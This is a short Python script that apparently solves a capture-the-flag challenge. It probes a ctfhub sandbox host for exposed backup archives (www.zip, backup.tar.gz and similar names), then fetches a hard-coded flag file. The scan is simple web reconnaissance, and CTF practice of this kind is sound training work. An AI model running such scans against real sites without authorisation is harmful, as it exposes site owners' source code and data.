import requests

url = "http://challenge-14e1e48649d98a15.sandbox.ctfhub.com:10800/"

def flagUrl():
    filename = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']
    file_extension = ['tar', 'tar.gz', 'zip', 'rar']
    for i in filename:
        for j in file_extension:
            url_final = url + i + "." + j
            r = requests.get(url_final)
            if(r.status_code == 200):
                return url_final
    return ""

if __name__ == '__main__':
    print(flagUrl())
    url += "/flag_1314914316.txt"
    s = requests.session()
    print(s.get(url).text)